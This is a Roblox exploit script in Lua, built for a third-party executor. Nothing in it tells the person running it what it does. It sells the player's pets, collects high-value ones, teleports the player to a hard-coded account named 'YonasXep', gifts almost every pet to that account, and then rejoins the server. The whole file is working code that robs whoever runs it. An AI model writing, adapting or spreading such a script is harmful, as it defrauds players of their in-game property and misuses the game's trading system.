
local PLRNAME = "YonasXep"
local P = game:GetService("Players")
--print(game:GetService("Players").LocalPlayer.PlayerGui.Data.Pets[tostring(game.Players.LocalPlayer:GetAttribute("HoldUID"))]:GetAttribute("T"))
--setclipboard(game:GetService("Players").LocalPlayer.PlayerGui.Data.Pets[tostring(game.Players.LocalPlayer:GetAttribute("HoldUID"))]:GetAttribute("T"))


repeat
	task.wait()
until game.Players.LocalPlayer:GetAttribute("DinoEventOnlineTime") ~= nil
local args = {
	"SellAll",
	"All",
	"Pet"
}
game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("PetRE"):FireServer(unpack(args))
task.wait(1)
game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("FishingRE"):FireServer("SetEggQuickSell",
	{
		["1"] = "\255",
		Diamond = false,
		["3"] = true,
		["2"] = false,
		["5"] = false,
		["4"] = false,
		["6"] = false,
		Golden = false,
		Electirc = false,
		Fire = false,
		Dino = false,
		Snow = false
	}
)
task.wait(3)
for _,v in pairs(workspace.PlayerBuiltBlocks:GetChildren()) do
	if v:FindFirstChild("RootPart") and v:FindFirstChild("RootPart"):FindFirstChild("ProximityPrompt") then
		fireproximityprompt(v.RootPart.ProximityPrompt)
		task.wait(.1)
	end
end
task.wait(7)

local deletePets = {}
for _, v in pairs(workspace.Pets:GetChildren()) do
	pcall(function()
		if v:IsA("Model") and v:GetAttribute("UserId") == game.Players.LocalPlayer.UserId then
			if not v.RootPart:FindFirstChild("GUI/BigPetGUI") then
				local petspeed = v.RootPart["GUI/IdleGUI"].Speed.Text
				local number = tonumber((petspeed:gsub("%D", "")))
				if number and number >= 300000 then
					table.insert(deletePets, v.Name)
				end
			end
		end
	end)
end

for _, petName in ipairs(deletePets) do
	game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("CharacterRE"):FireServer("Del", petName)
end


local Blacklist = {"Seaturtle", "Butterflyfish"}
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players['YonasXep'].Character.HumanoidRootPart.CFrame
task.wait(1)
for _,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Data.Pets:GetChildren()) do
	if not table.find(Blacklist, v:GetAttribute("T")) then
		game:GetService("ReplicatedStorage").Remote.CharacterRE:FireServer("Focus", v.Name)
		task.wait(0.1)
    	game:GetService("ReplicatedStorage").Remote.GiftRE:FireServer(P:WaitForChild(PLRNAME))
		task.wait(0.3)
	end
end
game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
